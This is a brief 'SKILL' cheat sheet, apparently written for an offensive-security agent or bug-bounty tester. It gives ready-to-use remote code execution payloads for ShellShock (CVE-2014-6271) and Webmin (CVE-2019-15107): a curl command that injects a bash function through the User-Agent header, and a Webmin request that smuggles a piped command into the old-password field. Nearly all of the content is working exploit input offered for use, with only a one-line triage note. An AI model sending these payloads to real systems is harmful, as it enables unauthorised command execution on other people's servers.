# SKILL: shellshock-webmin
## ShellShock (CVE-2014-6271)
User-Agent: () { :; }; /bin/bash -c 'id'
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" https://target.com/cgi-bin/script.cgi
## Webmin (CVE-2019-15107)
v1.890: expired=id
<=v1.920 != v1.890: user=root&pam=&expired=2&old=vrvik|id&new1=vrvik&new2=vrvik
## Triage
RCE → Critical.
